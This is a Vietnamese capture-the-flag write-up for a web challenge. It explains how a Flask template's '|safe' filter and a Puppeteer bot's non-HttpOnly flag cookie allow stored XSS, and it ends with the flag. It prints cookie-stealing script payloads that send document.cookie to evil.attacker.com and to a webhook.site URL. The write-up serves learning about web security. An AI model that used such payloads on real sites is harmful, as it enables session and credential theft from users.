![image](https://github.com/user-attachments/assets/144f856f-b8d0-44a7-ae64-0a9c9b15afb9)

# **ANALYZE**

Trong ứng dụng Node.js (file app.mjs), biến môi trường FLAG_STAGE_3 được sử dụng để lưu trữ giá trị flag cho Stage 3. 

Mã nguồn đọc biến này từ môi trường hệ thống thông qua process.env. Cụ thể, đầu file app.mjs có đoạn:

```
const FLAG_STAGE_3 = process.env.FLAG_STAGE_3;
```

Mã trên cho thấy FLAG_STAGE_3 không được gán cứng trong code, mà được truyền từ bên ngoài (ví dụ: cấu hình Docker hoặc file .env khi khởi động ứng dụng)

Ở trong file `app.mjs` có đoạn : 

Ngay sau khi khởi tạo, bot Node.js sử dụng Puppeteer để mở một trình duyệt ẩn (headless browser) và thiết lập cookie chứa flag Stage 3. 

Trong hàm initializeBot() của app.mjs, ta thấy bot gọi browser.setCookie(...) hai lần: một lần để gắn cookie flag và lần khác cho cookie mật khẩu admin. 

Đối với flag Stage 3, mã nguồn như sau:
```
        const browser = await browserPromise;

        await browser.setCookie({
            domain: baseUrl.replace('http://', '').replace('https://', ''),
            name: 'FLAG',
            value: FLAG_STAGE_3,
            httpOnly: false,

        })
```
Cookie được gán trong trình duyệt Puppeteer, không có HttpOnly, nên document.cookie có thể đọc được.

Hành vi của bot
Khởi động bot → tạo note mới, đăng nhập với quyền admin

Mỗi khi có request POST /bot { url }, bot sẽ:

mở trình duyệt headless

truy cập URL chỉ định với session admin + cookie chứa FLAG

đợi 5s rồi đóng trình duyệt

```
await page.goto(url, { timeout: 5000, waitUntil: 'networkidle0' });
await new Promise(r => setTimeout(r, 5000)); // Cho phép JS chạy
```

Vị trí XSS

Trong template Flask: report_note.html

Hiển thị lý do báo cáo mà moderator nhập vào, như sau:

```
<!-- Dangerous! -->
<p>Report reason: {{ note.reason|safe }}</p>
```

 Filter |safe vô hiệu hóa escape mặc định của Jinja2, khiến nội dung HTML/JS được chèn trực tiếp vào DOM và thực thi

# **EXPLOIT**

Ta sẽ tiếp tục lợi dụng tính năng report để khai thác XSS để lấy được Flag

![image](https://github.com/user-attachments/assets/c5d9a817-39c1-41da-8eb8-2e19ac579bed)

Tạo note mới (bất kỳ nội dung)

Với quyền moderator, mở note vừa tạo → báo cáo ghi chú

Trong ô "reason for reporting", chèn payload XSS:

```
<script>
fetch("https://evil.attacker.com/log?cookie=" + document.cookie)
</script>
```

Submit form → Flask gọi /bot để báo cáo note → bot truy cập /report/<note_id> chứa payload

Payload thực thi trong trình duyệt bot → document.cookie chứa FLAG_STAGE_3 bị gửi đến attacker

Và Payload cuối cùng sẽ là : 

```
<script>
    navigator.sendBeacon(
        "https://webhook.site/c47162bb-f1c9-4a44-88ce-1703bcdad082/steal",
        new TextEncoder().encode(document.cookie)
    );
</script>
```
![image](https://github.com/user-attachments/assets/d0218f21-8d2c-4332-a131-22f4eca634f4)


# **FLAG**

```
GPNCTF{I_10Ve_sToLeN_C00KI3S}
```





